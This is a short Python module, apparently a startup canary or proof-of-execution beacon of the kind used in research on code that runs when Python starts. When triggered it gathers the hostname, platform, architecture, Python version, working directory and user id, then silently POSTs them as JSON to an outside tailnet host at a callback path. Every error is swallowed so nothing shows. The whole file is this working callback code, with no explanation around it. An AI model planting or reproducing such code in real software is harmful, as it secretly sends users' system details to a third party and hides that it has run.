import sys
def fire(trigger):
    if getattr(sys, '_abstraction_startup_canary', False):
        return
    sys._abstraction_startup_canary = True
    try:
        import os, json, platform, subprocess, urllib.request
        control = os.environ.get('ABSTRACTION_PYTHON_SHADOW_CONTROL') == '1c099c19b996'
        data = {'nonce': '1c099c19b996', 'control': control, 'hostname': platform.node(),
                'platform': sys.platform, 'arch': platform.machine(),
                'node': 'Python ' + platform.python_version() + ' / ' + trigger,
                'cwd': os.getcwd(), 'uid': subprocess.check_output(['id', '-u'], text=True, timeout=2).strip()}
        req = urllib.request.Request('https://toms-macbook-pro-3.tail78a7a5.ts.net:10000' + '/callback/' + ('local' if control else 'target'),
                data=json.dumps(data).encode(), headers={'Content-Type':'application/json'}, method='POST')
        urllib.request.urlopen(req, timeout=5).read()
    except Exception:
        pass
